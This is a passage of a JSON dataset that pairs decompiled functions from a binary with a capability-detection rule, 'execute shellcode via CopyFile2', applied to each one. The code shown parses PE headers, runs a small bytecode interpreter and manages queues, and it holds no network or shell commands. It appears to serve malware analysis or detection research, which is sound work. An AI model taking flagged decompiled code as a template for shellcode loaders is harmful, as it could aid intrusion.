(((iVar3 == 0) && (iVar3 = fcn.000305f0(uStack328, &iStack320),  iVar3 == 0)) &&\n                   (iVar3 = fcn.0004fdb8(&iStack304),  iVar5 = iStack304,  iVar3 == 0)) {\n                    iVar3 = fcn.000305f0(iStack304, &iStack312);\n                    iVar4 = iStack312;\n                    if (iVar3 != 0) {\n                        iVar4 = iVar5;\n                    }\n                    iStack312 = iVar4;\n                    fcn.0006677c(&uStack168, 0, 0x58);\n                    uStack96 = uStack192;\n                    uStack88 = uStack184;\n                    uStack166 = 0x58;\n                    uStack168 = 0x30;\n                    uStack120 = 0x10001;\n                    uStack104 = uStack328;\n                    iVar3 = fcn.0006691a(uStack192, iVar4, &uStack168, &uStack168);\n                    if ((iVar3 == 0) && (iVar3 = iStack116,  iStack116 == 0)) {\n                        auStack296[0] = 0x1f;\n                        fcn.00066914(iStack320, 2, auStack296);\n                        iVar3 = fcn.0001ebec(iStack320, 0);\n                    }\n                }\n            }\n        }\n    }\n    fcn.00030650(iVar5, iStack312);\n    fcn.00030d24(arg1);\n    if (iVar3 == 0) {\n        if (arg3 != NULL) {\n            *arg3 = uStack328;\n        }\n    }\n    else {\n        if (iStack320 != 0) {\n            fcn.0001f210(iStack320, 0);\n            fcn.000666f2(uStack328);\n            uStackX32 = 0xffffffffffb3b4c0;\n            (**0x115e8)(0, 0, &uStackX32);\n        }\n        if (iStack248 != 0) {\n            uStack288 = 0;\n            fcn.00066908(0xffffffffffffffff, &iStack248, &uStack288, 0x8000);\n        }\n    }\n    fcn.00030650(uStack328, iStack320);\n    return iVar3;\n}\n",
        "token_count": 1223
    },
    "000510e8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.000510e8(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    ulong uStackX8;\n    int64_t iStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    uint64_t uVar4;\n    int32_t aiStack72 [12];\n    \n    uVar4 = 0;\n    iStackX16 = 0;\n    uVar3 = fcn.0001a5bc(*(arg1 + 0x17), *(arg1 + 0x2f), 0, 0);\n    if (uVar3 == 0) {\n        uStackX8 = 0xfffffffff70f2e80;\n        uVar3 = fcn.000667be(*(arg1 + 0x43), 0, &uStackX8);\n        if (uVar3 == 0x102) {\n            *(arg1 + 0x53) = 1;\n            uStackX8 = CONCAT44(uStackX8._4_4_, 100);\n            while( true ) {\n                LOCK();\n                puVar1 = arg1 + 0x5b;\n                uVar4 = *puVar1;\n                *puVar1 = *puVar1 ^ (uVar4 == 0) * *puVar1;\n                if (uVar4 == 0) break;\n                if (uStackX8 == 0) goto code_r0x000511b6;\n                uStackX24 = 0xfffffffffff0bdc0;\n                (**0x115e8)(0, 0, &uStackX24);\n                uStackX8 = uStackX8 & 0xffffffff00000000 | uStackX8 - 1;\n            }\n            if (uStackX8 != 0) {\n                LOCK();\n                puVar1 = arg1 + 0x53;\n                uVar4 = *puVar1;\n                *puVar1 = *puVar1 ^ (uVar4 == 0) * *puVar1;\n                if (uVar4 == 0) goto code_r0x0005126e;\n            }\ncode_r0x000511b6:\n            *(arg1 + 0x2b) = 0;\n        }\n        else {\n            *(arg1 + 0x2b) = 0;\n            if (uVar3 == 0) {\n                while( true ) {\n                    LOCK();\n                    puVar1 = arg1 + 0x5b;\n                    uVar2 = *puVar1;\n                    *puVar1 = *puVar1 ^ (uVar2 == 0) * *puVar1;\n                    if (uVar2 == 0) break;\n                    uStackX32 = 0xfffffffffff0bdc0;\n                    (**0x115e8)(0, 0, &uStackX32);\n                }\n                if (*(arg1 + 0x4b) == 0) {\n                    uVar3 = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00066884(*(arg1 + 0x1b), *(arg1 + 0x4b), 0xffffffffffffffff, &iStackX16, 0x10000000, \n                                         0x200, uVar4 & 0xffffffff00000000);\n                    if ((uVar3 == 0) && (uVar3 = fcn.0001f350(iStackX16, 0, aiStack72, 0x30),  uVar3 == 0)) {\n                        uVar3 = -(aiStack72[0] != 1) & 0xc0000001;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0005126e:\n    if (iStackX16 != 0) {\n        fcn.000666f2();\n    }\n    fcn.000666f2(*(arg1 + 0x43));\n    return uVar3;\n}\n",
        "token_count": 896
    },
    "00051810": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00051810(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int32_t *arg2_00;\n    int64_t aiStack664 [2];\n    int16_t aiStack648 [30];\n    int32_t iStack588;\n    int32_t aiStack584 [6];\n    int16_t iStack560;\n    int32_t aiStack328 [68];\n    \n    aiStack664[0] = 0;\n    arg2_00 = aiStack584;\n    iVar1 = fcn.0004cf30(aiStack664, 0x18, arg1);\n    arg1_00 = aiStack664[0];\n    if (iVar1 == 0) {\n        if (aiStack664[0] == 0) {\n            fcn.0006670a(aiStack648, arg2, 0x40);\n        }\n        else {\n            iVar1 = fcn.00030c58(aiStack664[0], arg2, aiStack648, 0x40);\n            arg1_00 = aiStack664[0];\n            if (iVar1 != 0) goto code_r0x000519ad;\n        }\n        if (aiStack648[0] == 0x5a4d) {\n            if (arg1_00 == 0) {\n                fcn.0006670a(aiStack584, arg2 + iStack588, 0xf8);\n            }\n            else {\n                iVar1 = fcn.00030c58(arg1_00, arg2 + iStack588, aiStack584, 0xf8);\n                arg1_00 = aiStack664[0];\n                if (iVar1 != 0) goto code_r0x000519ad;\n            }\n            if (aiStack584[0] == 0x4550) {\n                if (iStack560 != 0x10b) {\n                    if (arg1_00 == 0) {\n                        fcn.0006670a(aiStack328, iStack588 + arg2, 0x108);\n                    }\n                    else {\n                        iVar1 = fcn.00030c58(arg1_00, iStack588 + arg2, aiStack328, 0x108);\n                        arg1_00 = aiStack664[0];\n                        if (iVar1 != 0) goto code_r0x000519ad;\n                    }\n                    arg2_00 = aiStack328;\n                }\n                iVar1 = fcn.000513c0(arg1_00, arg2_00, arg2, arg1);\n                arg1_00 = aiStack664[0];\n                goto code_r0x000519ad;\n            }\n        }\n        iVar1 = -1;\n    }\ncode_r0x000519ad:\n    fcn.000666f2(arg1_00);\n    return iVar1;\n}\n",
        "token_count": 640
    },
    "00054074": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00054074(int64_t arg1, int64_t arg2, uint *arg3)\n\n{\n    ulong arg1_00;\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX8 [3];\n    ulong uStackX32;\n    uchar auStack664 [192];\n    int32_t iStack472;\n    int32_t iStack464;\n    int32_t iStack448;\n    int32_t iStack432;\n    uint uStack424;\n    \n    if (arg1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (arg2 == 0) {\n        uVar2 = 0x21590066;\n    }\n    else if (arg3 == NULL) {\n        uVar2 = 0x21590067;\n    }\n    else {\n        uVar2 = fcn.0004e130(arg1, arg2, auStackX8);\n        arg1_00 = auStackX8[0];\n        if (uVar2 == 0) {\n            uVar2 = fcn.0001ac10(auStackX8[0], 0x40, 0, &uStackX32);\n            if (uVar2 == 0) {\n                fcn.00053f78(auStack664);\n                fcn.00052628(auStack664);\n                fcn.00052648(auStack664, 0);\n                fcn.00052458(auStack664, auStackX8[0]);\n                uVar2 = 0xffffffff;\n                do {\n                    iVar1 = fcn.00053fb0(auStack664);\n                    if (iVar1 == 0) goto code_r0x00054173;\n                } while ((((iStack472 != 0x118) || (iStack464 != 0x8c)) || (iStack448 != 0x25)) || (iStack432 != 0x8f));\n                uVar2 = 0;\n                *arg3 = uStack424;\ncode_r0x00054173:\n                fcn.0001ac80(arg1_00, uStackX32);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 486
    },
    "00056584": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.00056584(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint64_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint16_t *puVar5;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint8_t auStackX8 [32];\n    uint8_t uStack168;\n    uint8_t auStack167 [3];\n    uchar auStack164 [4];\n    uchar auStack160 [4];\n    uint32_t uStack156;\n    uint32_t uStack152;\n    uchar auStack148 [4];\n    uchar auStack144 [4];\n    uchar auStack140 [4];\n    uchar auStack136 [4];\n    uchar auStack132 [4];\n    uchar auStack128 [4];\n    uchar auStack124 [4];\n    uint32_t auStack120 [16];\n    uint16_t *puVar6;\n    \n    arg4 = arg4 & 0xffffffff;\n    if (arg1 == 0) {\n        return 0xffffffff;\n    }\n    puVar5 = arg1 + -8;\n    uVar1 = 0;\n    uVar3 = 0;\ncode_r0x000565bd:\n    while( true ) {\n        uVar10 = uVar3;\n        uVar9 = uVar1;\n        puVar6 = puVar5;\n        puVar5 = puVar6 + 4;\n        uVar2 = *puVar5;\n        uVar8 = uVar9;\n        iVar7 = arg4;\n        uVar1 = uVar9;\n        uVar3 = uVar10;\n        if (0x35 < uVar2) break;\n        if (uVar2 == 0x35) {\n            if (*(puVar6 + 6) <= uVar10) goto code_r0x0005692d;\n            goto code_r0x000566a6;\n        }\n        if (uVar2 < 0x17) {\n            if (uVar2 == 0x16) {\n                return uVar10;\n            }\n            if (uVar2 < 6) {\n                if (uVar2 == 5) {\n                    uVar8 = *(puVar6 + 6);\n                    goto code_r0x000566ac;\n                }\n                if (uVar2 == 0) {\n                    uVar3 = *(puVar6 + 6);\n                }\n                else if (uVar2 == 1) {\n                    uVar1 = *(puVar6 + 6);\n                }\n                else if (uVar2 == 2) {\n                    auStack120[*(puVar6 + 6)] = uVar10;\n                }\n                else if (uVar2 == 3) {\n                    auStack120[*(puVar6 + 6)] = uVar8;\n                }\n                else {\n                    if (uVar2 != 4) {\n                        return 0;\n                    }\n                    uVar3 = uVar10 + *(puVar6 + 6);\n                }\n            }\n            else {\n                if (uVar2 == 6) {\n                    return *(puVar6 + 6);\n                }\n                if (uVar2 == 7) {\n                    uVar1 = uVar10;\n                }\n                else if (uVar2 == 0xc) {\n                    uVar3 = uVar10 + uVar8;\n                }\n                else {\n                    if (uVar2 != 0x14) {\n                        if (uVar2 != 0x15) {\n                            return 0;\n                        }\n                        uVar8 = *(puVar6 + 6);\ncode_r0x00056703:\n                        if (uVar10 == uVar8) goto code_r0x0005692d;\n                        goto code_r0x000566a6;\n                    }\n                    uVar3 = uVar10 - *(puVar6 + 6);\n                }\n            }\n        }\n        else if (uVar2 < 0x29) {\n            if (uVar2 == 0x28) {\n                if (arg4 < *(puVar6 + 6) + 2U) {\n                    return 0;\n                }\n                fcn.0006694a(arg2, *(puVar6 + 6), auStack164, 0, 2, auStack140);\n                goto code_r0x000568b5;\n            }\n            if (uVar2 == 0x1c) {\n                uVar3 = uVar10 - uVar8;\n            }\n            else {\n                if (uVar2 == 0x1d) goto code_r0x00056703;\n                if (uVar2 == 0x20) {\n                    if (arg4 < *(puVar6 + 6) + 4U) {\n                        return 0;\n                    }\n                    fcn.0006694a(arg2, *(puVar6 + 6), &uStack156, 0, 4, auStack148);\n                    uVar3 = uStack156;\n                    goto code_r0x000566f5;\n                }\n                if (uVar2 != 0x24) {\n                    if (uVar2 != 0x25) {\n                        return 0;\n                    }\n                    if (*(puVar6 + 6) < uVar10) goto code_r0x0005692d;\ncode_r0x000566a6:\n                    uVar4 = *(puVar6 + 0xb);\n                    goto code_r0x000566aa;\n                }\n                uVar3 = uVar10 * *(puVar6 + 6);\n            }\n        }\n        else if (uVar2 == 0x2c) {\n            uVar3 = uVar10 * uVar8;\n        }\n        else {\n            if (uVar2 == 0x2d) {\n                if (uVar8 < uVar10) goto code_r0x0005692d;\n                goto code_r0x000566a6;\n            }\n            if (uVar2 == 0x30) {\n                if (iVar7 <= *(puVar6 + 6)) {\n                    return 0;\n                }\n                fcn.0006694a(arg2, *(puVar6 + 6), auStackX8, 0, 1, auStack124);\n                uVar3 = auStackX8[0];\n            }\n            else {\n                if (uVar2 != 0x34) {\n                    return 0;\n                }\n                uVar3 = uVar10 / *(puVar6 + 6);\n            }\n        }\n    }\n    if (0x60 < uVar2) {\n        if (0x80 < uVar2) {\n            uVar1 = arg3;\n            if (uVar2 != 0x81) {\n                if (uVar2 == 0x84) {\n                    uVar1 = uVar9;\n                    uVar3 = -uVar10;\n                }\n                else {\n                    uVar1 = uVar9;\n                    uVar3 = uVar8;\n                    if (uVar2 != 0x87) {\n                        if (uVar2 != 0xb1) {\n                            return 0;\n                        }\n                        if (iVar7 <= *(puVar6 + 6)) {\n                            return 0;\n                        }\n                        fcn.0006694a(arg2, *(puVar6 + 6), auStack167, 0, 1, auStack128);\n                        uVar1 = (auStack167[0] & 0xf) << 2;\n                        uVar3 = uVar10;\n                    }\n                }\n            }\n            goto code_r0x000565bd;\n        }\n        uVar3 = arg3;\n        if (uVar2 == 0x80) goto code_r0x000565bd;\n        if (uVar2 != 0x61) {\n            if (uVar2 == 100) {\n                uVar4 = *(puVar6 + 6);\n            }\n            else {\n                uVar4 = uVar9;\n                if (uVar2 != 0x6c) {\n                    if (uVar2 == 0x74) {\n                        uVar4 = *(puVar6 + 6);\n                    }\n                    else if (uVar2 != 0x7c) {\n                        return 0;\n                    }\n                    uVar3 = uVar10 >> (uVar4 & 0x1f);\n                    goto code_r0x000565bd;\n                }\n            }\n            uVar3 = uVar10 << (uVar4 & 0x1f);\n            goto code_r0x000565bd;\n        }\n        uVar1 = auStack120[*(puVar6 + 6)];\n        uVar3 = uVar10;\n        goto code_r0x000565bd;\n    }\n    if (uVar2 == 0x60) {\n        uVar3 = auStack120[*(puVar6 + 6)];\n        goto code_r0x000565bd;\n    }\n    if (uVar2 < 0x49) {\n        if (uVar2 == 0x48) {\n            if (arg4 < uVar8 + *(puVar6 + 6) + 2U) {\n                return 0;\n            }\n            fcn.0006694a(arg2, uVar8 + *(puVar6 + 6), auStack160, 0, 2, auStack144);\ncode_r0x000568b5:\n            uVar2 = fcn.00030df4();\n            uVar3 = uVar2;\n            goto code_r0x000565bd;\n        }\n        if (uVar2 == 0x3c) {\n            if (uVar8 == 0) {\n                return 0;\n            }\n            uVar3 = uVar10 / uVar9;\n            goto code_r0x000565bd;\n        }\n        if (uVar2 == 0x3d) {\n            if (uVar8 <= uVar10) goto code_r0x0005692d;\n            goto code_r0x000566a6;\n        }\n        if (uVar2 == 0x40) {\n            if (arg4 < uVar8 + *(puVar6 + 6) + 4U) {\n                return 0;\n            }\n            fcn.0006694a(arg2, uVar8 + *(puVar6 + 6), &uStack152, 0, 4, auStack132);\n            uVar3 = uStack152;\ncode_r0x000566f5:\n            uVar3 = fcn.00030dc8(uVar3);\n            goto code_r0x000565bd;\n        }\n        if (uVar2 == 0x44) {\n            uVar3 = uVar10 | *(puVar6 + 6);\n            goto code_r0x000565bd;\n        }\n        if (uVar2 != 0x45) {\n            return 0;\n        }\n        uVar8 = *(puVar6 + 6);\n    }\n    else {\n        if (uVar2 == 0x4c) {\n            uVar3 = uVar10 | uVar8;\n            goto code_r0x000565bd;\n        }\n        if (uVar2 != 0x4d) {\n            if (uVar2 == 0x50) {\n                if (iVar7 <= uVar8 + *(puVar6 + 6)) {\n                    return 0;\n                }\n                fcn.0006694a(arg2, uVar8 + *(puVar6 + 6), &uStack168, 0, 1, auStack136);\n                uVar3 = uStack168;\n            }\n            else if (uVar2 == 0x54) {\n                uVar3 = uVar10 & *(puVar6 + 6);\n            }\n            else {\n                if (uVar2 != 0x5c) {\n                    return 0;\n                }\n                uVar3 = uVar10 & uVar8;\n            }\n            goto code_r0x000565bd;\n        }\n    }\n    if ((uVar8 & uVar10) == 0) goto code_r0x000566a6;\ncode_r0x0005692d:\n    uVar4 = *(puVar6 + 5);\ncode_r0x000566aa:\n    uVar8 = uVar4;\ncode_r0x000566ac:\n    puVar5 = puVar5 + uVar8 * 4;\n    goto code_r0x000565bd;\n}\n",
        "token_count": 2763
    },
    "0005a10c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.0005a10c(int64_t arg1, int64_t *arg2, uint *arg3)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong *puVar4;\n    ulong uStack72;\n    ulong uStack64;\n    \n    iVar2 = 0;\n    if (arg3 != NULL) {\n        *arg3 = 0;\n    }\n    arg1_00 = arg1 + 0x78;\n    fcn.00030310(arg1_00);\n    if (*(arg1 + 0x2a0) == 0) {\n        iVar1 = *(arg1 + 0x29c);\n        if (*(arg1 + 0x298) == iVar1) {\n            uStack72 = *(arg1 + 0x60);\n            uStack64 = 0;\n            iVar2 = fcn.000638cc(arg2, &uStack72, 0, 0);\n            if (iVar2 == 0) {\n                for (puVar4 = *(arg1 + 0x70); puVar4 != NULL; puVar4 = *puVar4) {\n                    if (*(puVar4 + 1) == 0) {\n                        iVar2 = fcn.00063f28(*arg2, puVar4 + 3, *(puVar4 + 0x14));\n                        if (iVar2 != 0) {\n                            fcn.00063b80(arg2, 0);\n                            goto code_r0x0005a27f;\n                        }\n                    }\n                    else {\n                        fcn.00064150(*arg2, *(puVar4 + 0xc), puVar4 + 3, *(puVar4 + 2));\n                    }\n                }\n                iVar2 = 0;\n            }\ncode_r0x0005a27f:\n            fcn.00030378(arg1_00);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg3 == NULL) {\n                iVar2 = fcn.00063e60(*arg2, 0);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                fcn.00063b80(arg2, 0);\n                return iVar2;\n            }\n            *arg3 = 1;\n            return 0;\n        }\n        uVar3 = iVar1 >> 0x1f & 0x1f;\n        iVar1 = (iVar1 + uVar3 & 0x1f) - uVar3;\n        *(arg1 + 0x29c) = iVar1;\n        *arg2 = *(arg1 + 0x98 + iVar1 * 0x10);\n        *(arg1 + 0x98 + *(arg1 + 0x29c) * 0x10) = 0;\n        *(arg1 + (*(arg1 + 0x29c) + 10) * 0x10) = 0xffffffff;\n        iVar1 = *(arg1 + 0x29c) + 1;\n        uVar3 = iVar1 >> 0x1f & 0x1f;\n        *(arg1 + 0x29c) = (iVar1 + uVar3 & 0x1f) - uVar3;\n    }\n    else if (*(arg1 + 0x2b0) == 0) {\n        if (*(arg1 + 0x2a8) == 0) {\n            iVar2 = 0x21590003;\n        }\n        else {\n            *arg2 = *(arg1 + 0x2a8);\n            *(arg1 + 0x2b0) = 1;\n        }\n    }\n    else {\n        iVar2 = 0x21590064;\n    }\n    fcn.00030378(arg1_00);\n    return iVar2;\n}\n",
        "token_count": 861
    },
    "0005b04c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005b04c(int64_t arg1)\n\n{\n    bool bVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    code *pcVar7;\n    uint32_t auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong uStackX32;\n    ulong in_stack_fffffffffffffe18;\n    ulong *puVar8;\n    ulong uStack456;\n    uint uStack448;\n    uint64_t *puStack440;\n    ulong uStack432;\n    uchar *puStack424;\n    ulong *puStack416;\n    uint uStack408;\n    uchar auStack400 [8];\n    ulong uStack392;\n    uint uStack384;\n    ulong uStack376;\n    int64_t iStack368;\n    uint uStack360;\n    uint32_t uStack356;\n    uchar *puStack96;\n    int64_t *piStack88;\n    ulong uStack80;\n    uint64_t *puStack72;\n    \n    uVar4 = in_stack_fffffffffffffe18 >> 0x20;\n    uVar5 = 0;\n    uStackX32 = 0;\n    bVar1 = false;\n    fcn.0006677c(&uStack376, 0, 0x138);\n    uStack376 = 0x7d480;\n    puVar8 = uVar4 << 0x20;\n    iVar3 = fcn.00064000(*(arg1 + 0x18), &puStack440, auStackX16, 600000);\n    if (iVar3 != 0) {\n        if (iVar3 == 0x21590003) {\n            return 0x21590003;\n        }\n        if (iVar3 == 0x21590002) {\n            return 0x21590002;\n        }\n        if (*(*(arg1 + 0x20) + 0x48) != 0) {\n            return iVar3;\n        }\n        pcVar7 = *(*(arg1 + 0x20) + 0x268);\n        if (pcVar7 == NULL) {\n            return iVar3;\n        }\n        (*pcVar7)(*(arg1 + 0x28), iVar3, 1);\n        return iVar3;\n    }\n    if (0xb < auStackX16[0]) {\n        uStack456 = *puStack440;\n        uStack448 = *(puStack440 + 1);\n        uVar4 = fcn.00030dc8(uStack456 & 0xffffffff);\n        uVar2 = uStack456 >> 0x20;\n        uStack456 = uStack456 & 0xffffffff00000000 | uVar4;\n        uVar4 = fcn.00030dc8(uVar2);\n        uVar2 = uStack456 & 0xffffffff;\n        uStack456 = uVar2 | uVar4 << 0x20;\n        if ((uStack448 == '\\0') || (uStack448 == '\\x01')) {\n            uStack456._0_4_ = uVar2;\n            uStack356 = uStack456;\n            if (uStack448 != '\\x01') {\n                uStack360 = 1;\n            }\n            puStack72 = puStack440;\n            iStack368 = arg1;\n            if (*(*(arg1 + 0x20) + 0x290) == 0) {\n                puVar8 = puVar8 & 0xffffffff00000000;\n                uVar5 = fcn.00064150(*(arg1 + 0x18), 9, 0, 0);\n                if (uVar5 == 0) {\n                    bVar1 = true;\n                }\n                else if (*(*(arg1 + 0x20) + 0x294) != 0) goto code_r0x0005b1fc;\ncode_r0x0005b201:\n                puVar8 = &uStackX32;\n                uVar5 = (**(*(arg1 + 0x20) + 0x38))(&uStack376);\n                if (bVar1) {\n                    puVar8 = puVar8 & 0xffffffff00000000;\n                    fcn.00064150(*(arg1 + 0x18), 10, 0, 0);\n                }\n            }\n            else {\ncode_r0x0005b1fc:\n                if (uVar5 == 0) goto code_r0x0005b201;\n            }\n            do {\n                puVar8 = puVar8 & 0xffffffff00000000;\n                iVar3 = fcn.00064000(*(arg1 + 0x18), &uStack432, aiStackX24, 0);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0x21590002) {\n                        uStack456._0_4_ = uStack356;\n                        uStack448 = 2;\n                        uStack456._4_4_ = uVar5;\n                        uVar6 = fcn.00030dc8(uStack356);\n                        uStack456 = CONCAT44(uStack456._4_4_, uVar6);\n                        uVar4 = fcn.00030dc8(uStack456._4_4_);\n                        uStack456 = uStack456 & 0xffffffff | uVar4 << 0x20;\n                        fcn.0006677c(&puStack424);\n                        puStack416 = &uStack456;\n                        uStack408 = 0xc;\n                        if (puStack96 == NULL) {\n                            puStack424 = auStack400;\n                        }\n                        else {\n                            puStack424 = puStack96;\n                            *piStack88 = auStack400;\n                        }\n                        uStack384 = 0;\n                        uStack392 = uStackX32;\n                        iVar3 = fcn.00064248(*(arg1 + 0x18), &puStack424, 0);\n                    }\n                    if (iVar3 == 0x21590003) {\n                        iVar3 = 0x21590006;\n                    }\n                    if (iVar3 != 0) {\n                        if ((*(*(arg1 + 0x20) + 0x48) == 0) && (pcVar7 = *(*(arg1 + 0x20) + 0x268),  pcVar7 != NULL)) {\n                            (*pcVar7)(*(arg1 + 0x28), iVar3, 2, pcVar7, puVar8);\n                        }\n                        pcVar7 = *(*(arg1 + 0x20) + 0x280);\n                        goto code_r0x0005b2b8;\n                    }\n                    break;\n                }\n                fcn.00063bf8(*(arg1 + 0x18), uStack432);\n            } while (0 < aiStackX24[0]);\n            pcVar7 = *(*(arg1 + 0x20) + 0x288);\ncode_r0x0005b2b8:\n            if (pcVar7 != NULL) {\n                (*pcVar7)(*(arg1 + 0x28), uStack80, uVar5, uStackX32, puVar8 & 0xffffffff00000000);\n            }\n            fcn.0005a95c(&uStack376);\n            goto code_r0x0005b2ef;\n        }\n    }\n    iVar3 = 0x2159000a;\n    if ((*(*(arg1 + 0x20) + 0x48) == 0) && (pcVar7 = *(*(arg1 + 0x20) + 0x268),  pcVar7 != NULL)) {\n        (*pcVar7)(*(arg1 + 0x28), 0x2159000a, 5);\n    }\ncode_r0x0005b2ef:\n    fcn.00030d24(uStackX32);\n    fcn.00030d24(uStack80);\n    if (*(arg1 + 0x18) != 0) {\n        fcn.00063bf8(*(arg1 + 0x18), puStack440);\n    }\n    return iVar3;\n}\n",
        "token_count": 1799
    },
    "0005c564": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.0005c564(int32_t *arg1, ulong arg2, ulong arg3, char *arg4)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t **arg1_00;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int64_t *piVar11;\n    char *pcVar12;\n    uint64_t in_stack_00000028;\n    char *pcStack456;\n    ulong uStack448;\n    char acStack440 [128];\n    char acStack312 [256];\n    \n    arg1_00 = fcn.00030c98(0x30);\n    if (arg1_00 == NULL) {\n        return 0x21590004;\n    }\n    fcn.0006677c(arg1_00);\n    fcn.000302c0(arg1_00 + 3);\n    uVar2 = *0x7d500;\n    *(arg1_00 + 4) = *0x7d4f8;\n    *(arg1_00 + 0x24) = uVar2;\n    do {\n        uVar3 = fcn.000667b8();\n        *arg1 = uVar3;\n        uVar3 = fcn.000667b8();\n        *(arg1 + 1) = uVar3;\n        uVar3 = fcn.000667b8();\n        *(arg1 + 2) = uVar3;\n        uVar3 = fcn.000667b8();\n        *(arg1 + 3) = uVar3;\n        fcn.00032174(0x8e060);\n        piVar11 = *0x8e078;\n        if (*0x8e078 != NULL) {\n            do {\n                if (*(piVar11 + 1) == *arg1) break;\n                piVar11 = *piVar11;\n            } while (piVar11 != NULL);\n        }\n        fcn.000321f4(0x8e060);\n    } while (piVar11 != NULL);\n    uVar10 = 0xffffffffffffffff;\n    *(arg1_00 + 1) = *arg1;\n    uVar7 = uVar10;\n    pcVar12 = arg4;\n    if (in_stack_00000028 == 0) {\n        pcStack456 = 0x159b8;\n    }\n    else {\n        do {\n            if (uVar7 == 0) break;\n            uVar7 = uVar7 - 1;\n            cVar1 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar1 != '\\0');\n        uVar7 = ~uVar7;\n        pcStack456 = arg4;\n        if (in_stack_00000028 < uVar7) {\n            iVar4 = 0x21590065;\n            goto code_r0x0005c824;\n        }\n        in_stack_00000028 = in_stack_00000028 + (-1 - (uVar7 - 1));\n        arg4 = arg4 + uVar7;\n    }\n    uStack448 = 0;\n    uVar8 = uVar10;\n    pcVar12 = arg4;\n    uVar7 = uVar10;\n    if (in_stack_00000028 == 0) {\n        fcn.00029534(acStack440, 0x80);\n        if ((arg3 >> 4 & 3) != 0) {\n            pcVar12 = acStack440;\n            do {\n                if (uVar8 == 0) break;\n                uVar8 = uVar8 - 1;\n                cVar1 = *pcVar12;\n                pcVar12 = pcVar12 + 1;\n            } while (cVar1 != '\\0');\n            fcn.00066836(acStack440 + (~uVar8 - 1), 0x11f1c);\n        }\n        pcVar12 = acStack440;\n    }\n    else {\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            cVar1 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar1 != '\\0');\n        uVar9 = ~uVar8 - 1;\n        if (in_stack_00000028 < uVar9) {\n            iVar4 = 0x21590066;\n            goto code_r0x0005c824;\n        }\n        in_stack_00000028 = in_stack_00000028 + (-1 - uVar9);\n        pcVar12 = arg4;\n        arg4 = arg4 + ~uVar8;\n    }\n    do {\n        if (uVar7 == 0) break;\n        cVar1 = *pcVar12;\n        uVar7 = uVar7 - 1;\n        pcVar12 = pcVar12 + 1;\n    } while (cVar1 != '\\0');\n    iVar4 = fcn.000638cc(arg1_00 + 2, &pcStack456, 0, 0);\n    if (iVar4 == 0) {\n        pcVar12 = arg4;\n        if (in_stack_00000028 == 0) {\n            iVar6 = fcn.0006682a(arg2);\n            if (iVar6 != 0) {\n                fcn.00063b80(arg1_00 + 2, 0);\n                iVar4 = 0x21590064;\n                goto code_r0x0005c824;\n            }\n            fcn.00044350(acStack312, 0x100, 0x15f60, arg2);\n            arg4 = acStack312;\n        }\n        else {\n            do {\n                if (uVar10 == 0) break;\n                uVar10 = uVar10 - 1;\n                cVar1 = *pcVar12;\n                pcVar12 = pcVar12 + 1;\n            } while (cVar1 != '\\0');\n            if (in_stack_00000028 < ~uVar10 - 1) {\n                iVar4 = 0x21590067;\n                goto code_r0x0005c824;\n            }\n        }\n        iVar4 = fcn.00063f28(arg1_00[2], arg4, 0);\n        if ((iVar4 == 0) && (iVar4 = fcn.00063e60(arg1_00[2], 0),  iVar6 = *0xfffff78000000320,  iVar4 == 0)) {\n            uVar5 = (**0x11308)();\n            *(arg1_00 + 5) = (uVar5 * iVar6) / 10000;\n            fcn.00032284(0x8e060);\n            *arg1_00 = *0x8e078;\n            *0x8e078 = arg1_00;\n            